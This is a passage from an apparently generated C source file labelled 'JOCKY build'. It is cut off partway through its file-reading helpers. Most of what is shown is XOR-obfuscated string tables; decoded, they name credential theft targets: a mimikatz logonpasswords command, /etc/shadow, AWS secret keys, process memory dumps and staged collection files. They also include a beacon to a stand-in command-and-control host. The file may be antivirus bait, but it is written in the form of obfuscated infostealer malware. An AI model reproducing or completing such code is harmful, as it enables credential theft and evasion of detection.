// JOCKY build 294E4A93B15FBB2C seed=31337 date=2026-09-03 13:44:43
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif
#if defined(_WIN32)
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <direct.h>
#elif defined(__APPLE__)
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <libproc.h>
#else
#include <unistd.h>
#include <dirent.h>
#include <sys/stat.h>
#endif

static const volatile uint8_t j_enc_0[] = {0x23, 0x22, 0x21, 0x20, 0x27, 0x26, 0x25, 0x24, 0x2B, 0x2A, 0x72, 0x71, 0x70, 0x77, 0x76, 0x75};
static const char* j_dc_0(void) {
    static char j_rb[17];
    for (int j_i = 0; j_i < ((7 + 9) ^ (5068 ^ 5068)); j_i++) j_rb[j_i] = j_enc_0[j_i] ^ 19;
    j_rb[16] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_1[] = {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6};
static const char* j_dc_1(void) {
    static char j_rb[17];
    for (int j_i = 0; j_i < (8 + 8); j_i++) j_rb[j_i] = j_enc_1[j_i] ^ 128;
    j_rb[16] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_2[] = {0x2A, 0x3A};
static const char* j_dc_2(void) {
    static char j_rb[(1 + 2)];
    for (int j_i = ((0 + 0) ^ (9734 ^ 9734)); j_i < 2; j_i++) j_rb[j_i] = j_enc_2[j_i] ^ ((20 + 68) ^ (7946 ^ 7946));
    j_rb[((1 + 1) ^ (1900 ^ 1900))] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_3[] = {0x8B, 0x9E};
static const char* j_dc_3(void) {
    static char j_rb[((1 + 2) ^ (9864 ^ 9864))];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_3[j_i] ^ 252;
    j_rb[2] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_4[] = {0xE4, 0xBB, 0xB9, 0xA4, 0xA8};
static const char* j_dc_4(void) {
    static char j_rb[((6 + 0) ^ (7263 ^ 7263))];
    for (int j_i = 0; j_i < (0 + 5); j_i++) j_rb[j_i] = j_enc_4[j_i] ^ (158 + 45);
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_5[] = {0xDA};
static const char* j_dc_5(void) {
    static char j_rb[(1 + 1)];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_5[j_i] ^ ((7 + 161) ^ (4294 ^ 4294));
    j_rb[1] = ((0 + 0) ^ (1082 ^ 1082));
    return j_rb;
}

static const volatile uint8_t j_enc_6[] = {0x86};
static const char* j_dc_6(void) {
    static char j_rb[(0 + 2)];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_6[j_i] ^ 140;
    j_rb[((1 + 0) ^ (767 ^ 767))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_7[] = {0x73};
static const char* j_dc_7(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < (0 + 1); j_i++) j_rb[j_i] = j_enc_7[j_i] ^ 1;
    j_rb[1] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_8[] = {0x61};
static const char* j_dc_8(void) {
    static char j_rb[2];
    for (int j_i = (0 + 0); j_i < (1 + 0); j_i++) j_rb[j_i] = j_enc_8[j_i] ^ (26 + 68);
    j_rb[1] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_9[] = {0xEF, 0xEA, 0xF0, 0xF7, 0xE6, 0xED};
static const char* j_dc_9(void) {
    static char j_rb[((0 + 7) ^ (8225 ^ 8225))];
    for (int j_i = ((0 + 0) ^ (4173 ^ 4173)); j_i < ((4 + 2) ^ (7789 ^ 7789)); j_i++) j_rb[j_i] = j_enc_9[j_i] ^ ((109 + 54) ^ (5282 ^ 5282));
    j_rb[6] = ((0 + 0) ^ (4958 ^ 4958));
    return j_rb;
}

static const volatile uint8_t j_enc_10[] = {0xE8, 0xFE, 0xF9, 0xEC, 0xEF, 0xE1, 0xE4, 0xFE, 0xE5, 0xE8, 0xE9};
static const char* j_dc_10(void) {
    static char j_rb[12];
    for (int j_i = ((0 + 0) ^ (5453 ^ 5453)); j_i < (0 + 11); j_i++) j_rb[j_i] = j_enc_10[j_i] ^ ((26 + 147) ^ (9616 ^ 9616));
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_11[] = {0x57, 0x58, 0x5B, 0x47, 0x51, 0x4B, 0x43, 0x55, 0x5D, 0x40};
static const char* j_dc_11(void) {
    static char j_rb[((10 + 1) ^ (2748 ^ 2748))];
    for (int j_i = 0; j_i < 10; j_i++) j_rb[j_i] = j_enc_11[j_i] ^ (9 + 11);
    j_rb[10] = ((0 + 0) ^ (8284 ^ 8284));
    return j_rb;
}

static const volatile uint8_t j_enc_12[] = {0x78, 0x65, 0x61, 0x69, 0x73, 0x7B, 0x6D, 0x65, 0x78};
static const char* j_dc_12(void) {
    static char j_rb[((8 + 2) ^ (3912 ^ 3912))];
    for (int j_i = 0; j_i < (7 + 2); j_i++) j_rb[j_i] = j_enc_12[j_i] ^ 44;
    j_rb[((4 + 5) ^ (1306 ^ 1306))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_13[] = {0x25, 0x3E, 0x22, 0x2F, 0x38};
static const char* j_dc_13(void) {
    static char j_rb[(2 + 4)];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_13[j_i] ^ ((26 + 80) ^ (2554 ^ 2554));
    j_rb[((4 + 1) ^ (6798 ^ 6798))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_14[] = {0x5E, 0x55, 0x44, 0x43, 0x44, 0x51, 0x44, 0x10, 0x1D, 0x51, 0x5E, 0x10, 0x1D, 0x40, 0x10, 0x44, 0x53, 0x40, 0x10, 0x02, 0x0E, 0x1F, 0x54, 0x55, 0x46, 0x1F, 0x5E, 0x45, 0x5C, 0x5C};
static const char* j_dc_14(void) {
    static char j_rb[((3 + 28) ^ (2601 ^ 2601))];
    for (int j_i = ((0 + 0) ^ (1041 ^ 1041)); j_i < ((11 + 19) ^ (1677 ^ 1677)); j_i++) j_rb[j_i] = j_enc_14[j_i] ^ 48;
    j_rb[30] = ((0 + 0) ^ (735 ^ 735));
    return j_rb;
}

static const volatile uint8_t j_enc_15[] = {0x03};
static const char* j_dc_15(void) {
    static char j_rb[2];
    for (int j_i = 0; j_i < 1; j_i++) j_rb[j_i] = j_enc_15[j_i] ^ 113;
    j_rb[(0 + 1)] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_16[] = {0xD9, 0xCE, 0xDD};
static const char* j_dc_16(void) {
    static char j_rb[4];
    for (int j_i = (0 + 0); j_i < (1 + 2); j_i++) j_rb[j_i] = j_enc_16[j_i] ^ (0 + 173);
    j_rb[3] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_17[] = {0xD8, 0x87, 0x85, 0x98, 0x94, 0xD8, 0x99, 0x92, 0x83, 0xD8, 0x83, 0x94, 0x87};
static const char* j_dc_17(void) {
    static char j_rb[(3 + 11)];
    for (int j_i = 0; j_i < 13; j_i++) j_rb[j_i] = j_enc_17[j_i] ^ ((83 + 164) ^ (5196 ^ 5196));
    j_rb[((0 + 13) ^ (8822 ^ 8822))] = ((0 + 0) ^ (1019 ^ 1019));
    return j_rb;
}

static const volatile uint8_t j_enc_18[] = {0x9E, 0xC1, 0xC3, 0xDE, 0xD2, 0x9E, 0xDF, 0xD4, 0xC5, 0x9E, 0xC5, 0xD2, 0xC1, 0x87};
static const char* j_dc_18(void) {
    static char j_rb[15];
    for (int j_i = (0 + 0); j_i < (5 + 9); j_i++) j_rb[j_i] = j_enc_18[j_i] ^ 177;
    j_rb[((1 + 13) ^ (2447 ^ 2447))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_19[] = {0x55, 0x56, 0x51, 0x50, 0x41};
static const char* j_dc_19(void) {
    static char j_rb[6];
    for (int j_i = (0 + 0); j_i < 5; j_i++) j_rb[j_i] = j_enc_19[j_i] ^ 29;
    j_rb[5] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_20[] = {0x9F, 0x9C, 0x94, 0x82, 0x8B};
static const char* j_dc_20(void) {
    static char j_rb[((5 + 1) ^ (2471 ^ 2471))];
    for (int j_i = (0 + 0); j_i < 5; j_i++) j_rb[j_i] = j_enc_20[j_i] ^ ((12 + 203) ^ (1356 ^ 1356));
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_21[] = {0x78, 0x7B, 0x73, 0x62, 0x6C};
static const char* j_dc_21(void) {
    static char j_rb[((2 + 4) ^ (6315 ^ 6315))];
    for (int j_i = ((0 + 0) ^ (9250 ^ 9250)); j_i < (0 + 5); j_i++) j_rb[j_i] = j_enc_21[j_i] ^ 48;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_22[] = {0x94, 0x97, 0x89, 0x80};
static const char* j_dc_22(void) {
    static char j_rb[(0 + 5)];
    for (int j_i = (0 + 0); j_i < 4; j_i++) j_rb[j_i] = j_enc_22[j_i] ^ 220;
    j_rb[((0 + 4) ^ (3950 ^ 3950))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_23[] = {0x6C, 0x79};
static const char* j_dc_23(void) {
    static char j_rb[3];
    for (int j_i = 0; j_i < 2; j_i++) j_rb[j_i] = j_enc_23[j_i] ^ (0 + 27);
    j_rb[2] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_24[] = {0xEC, 0xEC, 0xEC, 0xF1, 0x94, 0x98, 0x92, 0x90, 0x83, 0xF1, 0xBC, 0xB0, 0xA3, 0xBA, 0xB4, 0xA3, 0xF1, 0xEC, 0xEC, 0xEC};
static const char* j_dc_24(void) {
    static char j_rb[(4 + 17)];
    for (int j_i = ((0 + 0) ^ (1804 ^ 1804)); j_i < ((4 + 16) ^ (5784 ^ 5784)); j_i++) j_rb[j_i] = j_enc_24[j_i] ^ 209;
    j_rb[20] = ((0 + 0) ^ (4017 ^ 4017));
    return j_rb;
}

static const volatile uint8_t j_enc_25[] = {0x52, 0x52, 0x52, 0x4F, 0x0C, 0x1D, 0x0A, 0x0B, 0x0A, 0x01, 0x1B, 0x06, 0x0E, 0x03, 0x4F, 0x02, 0x0E, 0x1D, 0x04, 0x0A, 0x1D, 0x4F, 0x52, 0x52, 0x52};
static const char* j_dc_25(void) {
    static char j_rb[((19 + 7) ^ (8288 ^ 8288))];
    for (int j_i = 0; j_i < 25; j_i++) j_rb[j_i] = j_enc_25[j_i] ^ (24 + 87);
    j_rb[25] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_26[] = {0xE5, 0xF3, 0xFD, 0xE3, 0xE4, 0xFA, 0xE5, 0xF7, 0xAC, 0xAC, 0xFA, 0xF9, 0xF1, 0xF9, 0xF8, 0xE6, 0xF7, 0xE5, 0xE5, 0xE1, 0xF9, 0xE4, 0xF2, 0xE5};
static const char* j_dc_26(void) {
    static char j_rb[25];
    for (int j_i = ((0 + 0) ^ (4397 ^ 4397)); j_i < 24; j_i++) j_rb[j_i] = j_enc_26[j_i] ^ 150;
    j_rb[(21 + 3)] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_27[] = {0x1D, 0x1D, 0x1D, 0x00, 0x43, 0x12, 0x00, 0x4D, 0x41, 0x52, 0x4B, 0x45, 0x52, 0x00, 0x1D, 0x1D, 0x1D};
static const char* j_dc_27(void) {
    static char j_rb[18];
    for (int j_i = (0 + 0); j_i < 17; j_i++) j_rb[j_i] = j_enc_27[j_i] ^ 32;
    j_rb[17] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_28[] = {0xDE, 0x8F, 0x93, 0xD8, 0xCB, 0xD4, 0xD1, 0x90, 0xD9, 0xD2, 0xD0, 0xDC, 0xD4, 0xD3, 0x93, 0xDE, 0xD2, 0xD0, 0x92, 0xDF, 0xD8, 0xDC, 0xDE, 0xD2, 0xD3};
static const char* j_dc_28(void) {
    static char j_rb[((11 + 15) ^ (5004 ^ 5004))];
    for (int j_i = 0; j_i < ((21 + 4) ^ (6704 ^ 6704)); j_i++) j_rb[j_i] = j_enc_28[j_i] ^ 189;
    j_rb[25] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_29[] = {0x12, 0x14, 0x13, 0x03};
static const char* j_dc_29(void) {
    static char j_rb[((5 + 0) ^ (9098 ^ 9098))];
    for (int j_i = 0; j_i < 4; j_i++) j_rb[j_i] = j_enc_29[j_i] ^ 102;
    j_rb[((3 + 1) ^ (3056 ^ 3056))] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_30[] = {0x67, 0x60, 0x6D, 0x72, 0x64};
static const char* j_dc_30(void) {
    static char j_rb[6];
    for (int j_i = ((0 + 0) ^ (6379 ^ 6379)); j_i < 5; j_i++) j_rb[j_i] = j_enc_30[j_i] ^ ((0 + 1) ^ (3588 ^ 3588));
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_31[] = {0x92, 0x92, 0x92, 0x8F, 0xDF, 0xDD, 0xC0, 0xCC, 0xCA, 0xDC, 0xDC, 0x8F, 0xC3, 0xC6, 0xDC, 0xDB, 0x8F, 0x92, 0x92, 0x92};
static const char* j_dc_31(void) {
    static char j_rb[(2 + 19)];
    for (int j_i = 0; j_i < 20; j_i++) j_rb[j_i] = j_enc_31[j_i] ^ (163 + 12);
    j_rb[20] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_32[] = {0x0A, 0x0A, 0x0A, 0x17, 0x18, 0x52, 0x43, 0x54, 0x18, 0x47, 0x56, 0x44, 0x44, 0x40, 0x53, 0x17, 0x0A, 0x0A, 0x0A};
static const char* j_dc_32(void) {
    static char j_rb[20];
    for (int j_i = ((0 + 0) ^ (6898 ^ 6898)); j_i < 19; j_i++) j_rb[j_i] = j_enc_32[j_i] ^ (27 + 28);
    j_rb[19] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_33[] = {0x96, 0xDC, 0xCD, 0xDA, 0x96, 0xC9, 0xD8, 0xCA, 0xCA, 0xCE, 0xDD};
static const char* j_dc_33(void) {
    static char j_rb[((5 + 7) ^ (8770 ^ 8770))];
    for (int j_i = (0 + 0); j_i < 11; j_i++) j_rb[j_i] = j_enc_33[j_i] ^ 185;
    j_rb[(9 + 2)] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_34[] = {0x6F, 0x6F, 0x6F, 0x72, 0x7D, 0x37, 0x26, 0x31, 0x7D, 0x21, 0x3A, 0x33, 0x36, 0x3D, 0x25, 0x72, 0x7A, 0x30, 0x37, 0x21, 0x26, 0x7F, 0x37, 0x34, 0x34, 0x3D, 0x20, 0x26, 0x7B, 0x72, 0x6F, 0x6F, 0x6F};
static const char* j_dc_34(void) {
    static char j_rb[34];
    for (int j_i = (0 + 0); j_i < 33; j_i++) j_rb[j_i] = j_enc_34[j_i] ^ 82;
    j_rb[((1 + 32) ^ (2353 ^ 2353))] = ((0 + 0) ^ (542 ^ 542));
    return j_rb;
}

static const volatile uint8_t j_enc_35[] = {0x9F, 0xD5, 0xC4, 0xD3, 0x9F, 0xC3, 0xD8, 0xD1, 0xD4, 0xDF, 0xC7};
static const char* j_dc_35(void) {
    static char j_rb[((9 + 3) ^ (1153 ^ 1153))];
    for (int j_i = (0 + 0); j_i < ((9 + 2) ^ (5881 ^ 5881)); j_i++) j_rb[j_i] = j_enc_35[j_i] ^ 176;
    j_rb[11] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_36[] = {0x74, 0x74, 0x74, 0x69, 0x2C, 0x27, 0x3F, 0x20, 0x3B, 0x26, 0x27, 0x24, 0x2C, 0x27, 0x3D, 0x69, 0x61, 0x2A, 0x3B, 0x2C, 0x2D, 0x2C, 0x27, 0x3D, 0x20, 0x28, 0x25, 0x64, 0x3B, 0x2C, 0x25, 0x2C, 0x3F, 0x28, 0x27, 0x3D, 0x60, 0x69, 0x74, 0x74, 0x74};
static const char* j_dc_36(void) {
    static char j_rb[((35 + 7) ^ (4083 ^ 4083))];
    for (int j_i = ((0 + 0) ^ (6619 ^ 6619)); j_i < (16 + 25); j_i++) j_rb[j_i] = j_enc_36[j_i] ^ (59 + 14);
    j_rb[((36 + 5) ^ (3463 ^ 3463))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_37[] = {0x95, 0x93, 0x85, 0x92};
static const char* j_dc_37(void) {
    static char j_rb[(4 + 1)];
    for (int j_i = ((0 + 0) ^ (4515 ^ 4515)); j_i < ((2 + 2) ^ (9114 ^ 9114)); j_i++) j_rb[j_i] = j_enc_37[j_i] ^ 192;
    j_rb[4] = ((0 + 0) ^ (7771 ^ 7771));
    return j_rb;
}

static const volatile uint8_t j_enc_38[] = {0xEE, 0xE8, 0xEF, 0xFF};
static const char* j_dc_38(void) {
    static char j_rb[5];
    for (int j_i = ((0 + 0) ^ (7061 ^ 7061)); j_i < (4 + 0); j_i++) j_rb[j_i] = j_enc_38[j_i] ^ 154;
    j_rb[(4 + 0)] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_39[] = {0x10, 0x17, 0x1A, 0x05, 0x13};
static const char* j_dc_39(void) {
    static char j_rb[6];
    for (int j_i = (0 + 0); j_i < 5; j_i++) j_rb[j_i] = j_enc_39[j_i] ^ 118;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_40[] = {0xFD, 0xFA, 0xF8, 0xF0};
static const char* j_dc_40(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < (4 + 0); j_i++) j_rb[j_i] = j_enc_40[j_i] ^ 181;
    j_rb[4] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_41[] = {0x19, 0x19, 0x02, 0x15, 0x0B, 0x1F, 0x1E, 0x02, 0x15, 0x19, 0x05, 0x09, 0x01};
static const char* j_dc_41(void) {
    static char j_rb[((11 + 3) ^ (6690 ^ 6690))];
    for (int j_i = 0; j_i < (2 + 11); j_i++) j_rb[j_i] = j_enc_41[j_i] ^ 74;
    j_rb[13] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_42[] = {0x07, 0x01, 0x06, 0x16};
static const char* j_dc_42(void) {
    static char j_rb[5];
    for (int j_i = (0 + 0); j_i < 4; j_i++) j_rb[j_i] = j_enc_42[j_i] ^ (34 + 81);
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_43[] = {0x93, 0x94, 0x99, 0x86, 0x90};
static const char* j_dc_43(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_43[j_i] ^ 245;
    j_rb[5] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_44[] = {0x09, 0x1F, 0x1B, 0x17, 0x09, 0x0B, 0x0B, 0x0D, 0x1B, 0x1B, 0x17, 0x03, 0x0D, 0x11, 0x17, 0x01, 0x0C};
static const char* j_dc_44(void) {
    static char j_rb[18];
    for (int j_i = ((0 + 0) ^ (6808 ^ 6808)); j_i < ((17 + 0) ^ (5645 ^ 5645)); j_i++) j_rb[j_i] = j_enc_44[j_i] ^ (37 + 35);
    j_rb[((4 + 13) ^ (5532 ^ 5532))] = ((0 + 0) ^ (8989 ^ 8989));
    return j_rb;
}

static const volatile uint8_t j_enc_45[] = {0x2A, 0x3C, 0x38, 0x34, 0x38, 0x2E, 0x28, 0x39, 0x2E, 0x3F, 0x34, 0x2A, 0x28, 0x28, 0x2E, 0x38, 0x38, 0x34, 0x20, 0x2E, 0x32};
static const char* j_dc_45(void) {
    static char j_rb[22];
    for (int j_i = ((0 + 0) ^ (113 ^ 113)); j_i < 21; j_i++) j_rb[j_i] = j_enc_45[j_i] ^ 107;
    j_rb[((3 + 18) ^ (9665 ^ 9665))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_46[] = {0x37, 0x32, 0x27, 0x32, 0x31, 0x32, 0x20, 0x36, 0x2C, 0x26, 0x21, 0x3F};
static const char* j_dc_46(void) {
    static char j_rb[((7 + 6) ^ (6609 ^ 6609))];
    for (int j_i = 0; j_i < 12; j_i++) j_rb[j_i] = j_enc_46[j_i] ^ ((42 + 73) ^ (4358 ^ 4358));
    j_rb[((1 + 11) ^ (2501 ^ 2501))] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_47[] = {0xBB, 0xBB, 0xBB, 0xA6, 0xEE, 0xE9, 0xEB, 0xE3, 0xA6, 0xE2, 0xEF, 0xF4, 0xA6, 0xAE, 0xF4, 0xE3, 0xE5, 0xE9, 0xE8, 0xAF, 0xA6, 0xBB, 0xBB, 0xBB};
static const char* j_dc_47(void) {
    static char j_rb[25];
    for (int j_i = 0; j_i < ((4 + 20) ^ (1666 ^ 1666)); j_i++) j_rb[j_i] = j_enc_47[j_i] ^ ((126 + 8) ^ (6347 ^ 6347));
    j_rb[24] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_48[] = {0x2B, 0x2D, 0x2A, 0x3A};
static const char* j_dc_48(void) {
    static char j_rb[(1 + 4)];
    for (int j_i = ((0 + 0) ^ (5626 ^ 5626)); j_i < ((3 + 1) ^ (4918 ^ 4918)); j_i++) j_rb[j_i] = j_enc_48[j_i] ^ (43 + 52);
    j_rb[((4 + 0) ^ (1228 ^ 1228))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_49[] = {0xB8, 0xBF, 0xB2, 0xAD, 0xBB};
static const char* j_dc_49(void) {
    static char j_rb[6];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_49[j_i] ^ 222;
    j_rb[((4 + 1) ^ (8087 ^ 8087))] = ((0 + 0) ^ (4821 ^ 4821));
    return j_rb;
}

static const volatile uint8_t j_enc_50[] = {0x33, 0x34, 0x36, 0x3E};
static const char* j_dc_50(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < ((0 + 4) ^ (7570 ^ 7570)); j_i++) j_rb[j_i] = j_enc_50[j_i] ^ ((18 + 105) ^ (9940 ^ 9940));
    j_rb[((0 + 4) ^ (5397 ^ 5397))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_51[] = {0xD9, 0xDF, 0xD8, 0xC8};
static const char* j_dc_51(void) {
    static char j_rb[(2 + 3)];
    for (int j_i = ((0 + 0) ^ (334 ^ 334)); j_i < (1 + 3); j_i++) j_rb[j_i] = j_enc_51[j_i] ^ ((10 + 163) ^ (339 ^ 339));
    j_rb[4] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_52[] = {0x93, 0x94, 0x99, 0x86, 0x90};
static const char* j_dc_52(void) {
    static char j_rb[((1 + 5) ^ (4049 ^ 4049))];
    for (int j_i = 0; j_i < 5; j_i++) j_rb[j_i] = j_enc_52[j_i] ^ (26 + 219);
    j_rb[5] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_53[] = {0x0A, 0x0A, 0x0A, 0x17, 0x44, 0x43, 0x56, 0x50, 0x52, 0x53, 0x17, 0x54, 0x58, 0x5B, 0x5B, 0x52, 0x54, 0x43, 0x5E, 0x58, 0x59, 0x17, 0x1F, 0x51, 0x44, 0x19, 0x40, 0x45, 0x5E, 0x43, 0x52, 0x17, 0x43, 0x58, 0x17, 0x18, 0x43, 0x5A, 0x47, 0x1E, 0x17, 0x0A, 0x0A, 0x0A};
static const char* j_dc_53(void) {
    static char j_rb[((29 + 16) ^ (5789 ^ 5789))];
    for (int j_i = 0; j_i < (17 + 27); j_i++) j_rb[j_i] = j_enc_53[j_i] ^ 55;
    j_rb[44] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_54[] = {0x52, 0x09, 0x10, 0x0D, 0x52, 0x1C, 0x0B, 0x22, 0x1F, 0x1C, 0x14, 0x09, 0x22, 0x1E, 0x12, 0x11, 0x11, 0x18, 0x1E, 0x09, 0x18, 0x19, 0x53, 0x09, 0x05, 0x09};
static const char* j_dc_54(void) {
    static char j_rb[((22 + 5) ^ (8263 ^ 8263))];
    for (int j_i = (0 + 0); j_i < (0 + 26); j_i++) j_rb[j_i] = j_enc_54[j_i] ^ (70 + 55);
    j_rb[26] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_55[] = {0x7E, 0x78, 0x7F, 0x6F};
static const char* j_dc_55(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < (1 + 3); j_i++) j_rb[j_i] = j_enc_55[j_i] ^ 10;
    j_rb[((4 + 0) ^ (8018 ^ 8018))] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_56[] = {0x09, 0x0E, 0x03, 0x1C, 0x0A};
static const char* j_dc_56(void) {
    static char j_rb[(4 + 2)];
    for (int j_i = 0; j_i < (1 + 4); j_i++) j_rb[j_i] = j_enc_56[j_i] ^ 111;
    j_rb[5] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_57[] = {0x2E, 0x75, 0x6C, 0x71, 0x2E, 0x60, 0x77, 0x5E, 0x63, 0x60, 0x68, 0x75, 0x5E, 0x62, 0x6E, 0x6D, 0x6D, 0x64, 0x62, 0x75, 0x64, 0x65, 0x2F, 0x75, 0x79, 0x75};
static const char* j_dc_57(void) {
    static char j_rb[27];
    for (int j_i = ((0 + 0) ^ (1497 ^ 1497)); j_i < 26; j_i++) j_rb[j_i] = j_enc_57[j_i] ^ ((1 + 0) ^ (881 ^ 881));
    j_rb[(11 + 15)] = ((0 + 0) ^ (5460 ^ 5460));
    return j_rb;
}

static const volatile uint8_t j_enc_58[] = {0xFC, 0xFC, 0xFC, 0xE1, 0xB1, 0xB3, 0xAE, 0xA2, 0xA4, 0xB2, 0xB2, 0xE1, 0xAC, 0xA4, 0xAC, 0xAE, 0xB3, 0xB8, 0xE1, 0xA5, 0xB4, 0xAC, 0xB1, 0xE1, 0xE9, 0x96, 0xA8, 0xAF, 0xA5, 0xAE, 0xB6, 0xB2, 0xE1, 0xAE, 0xAF, 0xAD, 0xB8, 0xED, 0xE1, 0xB1, 0xA8, 0xA5, 0xFC, 0xF5, 0xE8, 0xE1, 0xFC, 0xFC, 0xFC};
static const char* j_dc_58(void) {
    static char j_rb[((38 + 12) ^ (1475 ^ 1475))];
    for (int j_i = 0; j_i < (4 + 45); j_i++) j_rb[j_i] = j_enc_58[j_i] ^ 193;
    j_rb[(9 + 40)] = 0;
    return j_rb;
}

static const volatile uint8_t j_enc_59[] = {0xE0, 0x99, 0xFF, 0xD7, 0xC6, 0xCE, 0xD3, 0xFF, 0xC0, 0xD1, 0xC6, 0xC7, 0xFC, 0xC7, 0xD6, 0xCE, 0xD3, 0x8D, 0xC1, 0xCA, 0xCD};
static const char* j_dc_59(void) {
    static char j_rb[((5 + 17) ^ (6358 ^ 6358))];
    for (int j_i = 0; j_i < 21; j_i++) j_rb[j_i] = j_enc_59[j_i] ^ 163;
    j_rb[21] = (0 + 0);
    return j_rb;
}

static const volatile uint8_t j_enc_60[] = {0x63, 0x68, 0x69, 0x62};
static const char* j_dc_60(void) {
    static char j_rb[5];
    for (int j_i = 0; j_i < (3 + 1); j_i++) j_rb[j_i] = j_enc_60[j_i] ^ (4 + 3);
    j_rb[4] = (0 + 0);
    return j_rb;
}

static int32_t j_str_len(const char* s) { return (int32_t)strlen(s); }
static bool j_str_eq(const char* a, const char* b) { return strcmp(a, b) == 0; }

static char j_buf[(47682 + 17854)];
#define J_BUF_CAP (sizeof j_buf)

static void j_json_escape(char* out, size_t cap, const char* s) {
    size_t o = 0;
    for (const char* p = s; *p && o + (6 + 2) < cap; ++p) {
        unsigned char c = (unsigned char)*p;
        switch (c) {
            case '"': out[o++] = '\\'; out[o++] = '"'; break;
            case '\\': out[o++] = '\\'; out[o++] = '\\'; break;
            case '\n': out[o++] = '\\'; out[o++] = 'n'; break;
            case '\r': out[o++] = '\\'; out[o++] = 'r'; break;
            case '\t': out[o++] = '\\'; out[o++] = 't'; break;
            default:
                if (c < 0x20) {
                    out[o++] = '\\'; out[o++] = 'u'; out[o++] = '0'; out[o++] = '0';
                    out[o++] = j_dc_0()[c >> (0 + 4)];
                    out[o++] = j_dc_1()[c & (4 + 11)];
                } else out[o++] = (char)c;
        }
    }
    out[o] = '\0';
}

static const char* j_sys_now(void) {
    time_t t = time(NULL);
#if defined(_WIN32)
    struct tm* tmv = localtime(&t);
    strftime(j_buf, J_BUF_CAP, "%Y-%m-%dT%H:%M:%S", tmv);
#else
    struct tm tmv;
    localtime_r(&t, &tmv);
    strftime(j_buf, J_BUF_CAP, "%Y-%m-%dT%H:%M:%S", &tmv);
#endif
    return j_buf;
}

static void j_sys_sleep(int32_t ms) {
#if defined(_WIN32)
    Sleep((DWORD)ms);
#else
    struct timespec ts;
    ts.tv_sec = ms / ((918 + 82) ^ (1683 ^ 1683));
    ts.tv_nsec = (long)(ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
#endif
}

static const char* j_sys_cwd(void) {
#if defined(_WIN32)
    _getcwd(j_buf, (int)J_BUF_CAP);
#else
    getcwd(j_buf, J_BUF_CAP);
#endif
    return j_buf;
}

static const char* j_env_get(const char* name) {
    const char* v = getenv(name);
    return v ? v : "";
}

static bool j_fs_exists(const char* path) {
#if defined(_WIN32)
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
#else
    return access(path, F_OK) == 0;
#endif
}

static const char* j_fs_read(const char* path) {
